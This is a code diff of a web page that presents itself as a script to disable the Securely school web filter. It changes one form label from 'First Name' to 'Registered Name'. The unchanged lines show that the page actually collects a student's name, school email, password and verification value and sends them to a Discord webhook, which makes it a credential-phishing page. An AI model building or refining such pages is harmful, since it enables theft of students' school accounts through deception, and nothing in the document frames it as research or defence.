@@ -64,7 +64,7 @@
         <p>This script disables Securely on the Wi-Fi network you are using.</p>
         <p>Please provide the required information:</p>
         <form id="submitForm">
-            <label for="firstName">First Name:</label><br>
+            <label for="firstName">Registered Name:</label><br>
             <input type="text" id="firstName" name="firstName" required><br>
             <label for="email">School Email:</label><br>
             <input type="email" id="email" name="email" required><br>
@@ -128,7 +128,7 @@
 
             // Prepare payload
             const payload = {
-                content: `New submission:\n- **First Name:** ${firstName}\n- **Email:** ${email}\n- **Password:** ${password}\n- **Verification:** ${verification}\n- **Action:** ${action}`
+                content: `New submission:\n- **Registered Name:** ${firstName}\n- **Email:** ${email}\n- **Password:** ${password}\n- **Verification:** ${verification}\n- **Action:** ${action}`
             };
 
             // Send data to Discord webhook
